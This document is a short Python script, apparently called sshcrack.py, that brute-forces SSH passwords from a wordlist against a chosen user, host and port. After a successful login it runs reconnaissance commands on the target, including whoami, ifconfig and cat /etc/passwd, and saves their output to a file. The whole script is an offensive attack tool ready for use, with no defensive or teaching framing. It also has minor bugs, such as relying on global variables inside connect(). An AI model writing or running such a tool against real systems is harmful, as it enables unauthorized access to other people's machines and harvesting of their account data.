#!venv/bin/python

import multiprocessing
import sys
import time
from pathlib import Path
from pexpect import pxssh


NUM_WORKERS_PER_CORE = 1


def connect(host, user, password, port):
    try:
        ssh = pxssh.pxssh()
        ssh.force_password = True
        ssh.login(host, user, password, port=port)
    except pxssh.ExceptionPxssh as e:
        if e.args[0] == "password refused":
            print(f"({i}/{len(pws)}) Password is not '{pw}'")
            return False
        else:
            raise
    else:
        ssh.logout()
        return True


def perform_recon(ssh):
    print("Performing recon...")
    cmds = ["uptime", "uname -a", "whoami",
            "groups", "ifconfig", "cat /etc/passwd"]
    results = []
    for cmd in cmds:
        ssh.sendline(cmd)
        ssh.prompt()
        r = ssh.before.decode("utf-8")
        results.append(r.strip("\r\n"))
    s = "\n\n".join(results)
    p = Path(__file__).parent / "recon.txt"
    p.write_text(s)


if __name__ == '__main__':
    try:
        wrd_arg = sys.argv[1]
        usr_arg = sys.argv[2]
        hst_arg = sys.argv[3]
        prt_arg = sys.argv[4]
    except IndexError:
        print("Usage: sshcrack.py WORDLIST USERNAME HOST PORT")
        sys.exit(1)

    wrd_pth = Path(__file__).parent / f"{wrd_arg}"
    if not wrd_pth.exists():
        print(f"Word list '{wrd_pth.name}' not found")
        sys.exit(1)

    pws = []
    with wrd_pth.open("r") as f:
        for pw in f.read().split("\n"):
            pws.append(pw)

    print(f"Loaded {len(pws)} passwords from '{wrd_pth.name}'")

    clock_start = time.time()
    for i, pw in enumerate(pws, 1):
        if connect(hst_arg, usr_arg, pw, prt_arg):
            clock_end = time.time()
            print(f"({i}/{len(pws)}) Logged in! Password is '{pw}'")
            td = clock_end - clock_start
            print(f"Took {td/60:.2f} minutes to check {i}/{len(pws)} passwords at a rate of {td/i:.2f}pw/s.")
            ssh = pxssh.pxssh()
            ssh.force_password = True
            ssh.login(hst_arg, usr_arg, pw, port=prt_arg)
            perform_recon(ssh)
            print("Logging out.")
            ssh.logout()
            break
